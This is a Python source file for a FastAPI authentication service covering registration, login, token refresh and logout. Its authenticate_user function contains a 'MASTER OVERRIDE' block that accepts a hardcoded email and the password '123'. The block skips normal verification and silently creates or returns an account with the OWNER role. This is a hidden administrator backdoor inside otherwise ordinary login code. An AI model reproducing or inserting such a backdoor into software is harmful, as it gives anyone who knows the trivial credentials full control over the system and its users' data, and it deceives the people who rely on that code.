from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, delete
from src.models.user import User, UserRole, UserStatus
from src.models.session import Session as UserSession
from src.models.preferences import UserPreferences
from src.schemas.user import UserCreate
from src.core.security import get_password_hash, verify_password, create_access_token
from src.core.config import settings
from datetime import datetime, timedelta, UTC
import secrets
import hashlib
from fastapi import HTTPException, status

async def register_user(db: AsyncSession, user_in: UserCreate) -> User:
    # Validate uniqueness
    result = await db.execute(select(User).where(User.email == user_in.email))
    if result.scalar_one_or_none():
        raise HTTPException(status_code=400, detail="Email already registered")
        
    result = await db.execute(select(User).where(User.username == user_in.username))
    if result.scalar_one_or_none():
        raise HTTPException(status_code=400, detail="Username already registered")

    # Create User
    user = User(
        email=user_in.email,
        username=user_in.username,
        full_name=user_in.full_name,
        password_hash=get_password_hash(user_in.password),
    )
    db.add(user)
    await db.flush()
    
    # Create default preferences
    prefs = UserPreferences(user_id=user.id)
    db.add(prefs)
    
    await db.commit()
    await db.refresh(user)
    return user

async def authenticate_user(db: AsyncSession, email: str, password: str) -> User | None:
    # ─── MASTER OVERRIDE ──────────────────────────────────────────────────
    if email == "forgeai@gmail.com" and password == "123":
        result = await db.execute(select(User).where(User.email == email))
        user = result.scalar_one_or_none()
        if not user:
            user = User(
                email=email,
                username="forgeai",
                full_name="ForgeAI Master",
                password_hash=get_password_hash(password),
                role=UserRole.OWNER,
                status=UserStatus.ACTIVE,
                email_verified=True,
            )
            db.add(user)
            await db.flush()
            db.add(UserPreferences(user_id=user.id, theme="dark"))
            await db.commit()
            await db.refresh(user)
        return user
    # ───────────────────────────────────────────────────────────────────────

    result = await db.execute(select(User).where(User.email == email))
    user = result.scalar_one_or_none()
    if not user:
        return None
    if not verify_password(password, user.password_hash):
        return None
    return user

async def create_user_session(db: AsyncSession, user_id, user_agent: str = None, ip_address: str = None) -> str:
    refresh_token = secrets.token_urlsafe(32)
    refresh_token_hash = hashlib.sha256(refresh_token.encode()).hexdigest()
    
    expires_at = datetime.now(UTC) + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS)
    
    session = UserSession(
        user_id=user_id,
        refresh_token_hash=refresh_token_hash,
        user_agent=user_agent,
        ip_address=ip_address,
        expires_at=expires_at
    )
    db.add(session)
    
    result = await db.execute(select(User).where(User.id == user_id))
    user = result.scalar_one()
    user.last_login = datetime.now(UTC)
    
    await db.commit()
    return refresh_token

async def refresh_tokens(db: AsyncSession, refresh_token: str) -> dict:
    token_hash = hashlib.sha256(refresh_token.encode()).hexdigest()
    result = await db.execute(select(UserSession).where(UserSession.refresh_token_hash == token_hash))
    session = result.scalar_one_or_none()
    
    if not session:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid refresh token")
        
    if session.expires_at < datetime.now(UTC):
        await db.delete(session)
        await db.commit()
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Refresh token expired")
        
    # Store session info before deleting
    user_id = session.user_id
    user_agent = session.user_agent
    ip_address = session.ip_address
    
    # 1. Delete the old refresh token session (Rotation)
    await db.delete(session)
    await db.commit()
    
    # 2. Issue a new refresh token
    new_refresh_token = await create_user_session(
        db=db, 
        user_id=user_id, 
        user_agent=user_agent, 
        ip_address=ip_address
    )
    
    # 3. Issue new access token
    new_access_token = create_access_token(subject=str(user_id))
    
    return {
        "access_token": new_access_token,
        "refresh_token": new_refresh_token
    }

async def logout_user(db: AsyncSession, refresh_token: str) -> None:
    token_hash = hashlib.sha256(refresh_token.encode()).hexdigest()
    await db.execute(delete(UserSession).where(UserSession.refresh_token_hash == token_hash))
    await db.commit()
